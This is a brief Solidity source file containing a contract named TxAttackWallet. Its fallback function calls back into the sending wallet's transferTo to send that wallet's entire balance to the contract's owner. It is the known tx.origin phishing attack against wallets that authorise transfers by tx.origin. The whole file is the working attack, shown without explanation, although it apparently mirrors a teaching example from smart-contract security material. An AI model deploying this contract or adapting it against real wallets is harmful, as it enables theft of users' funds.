pragma solidity >=0.5.0 <0.7.0;

interface TxUserWallet {
    function transferTo(address payable dest, uint amount) external;
}

contract TxAttackWallet {
    address payable owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function() external payable {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);

    }
}
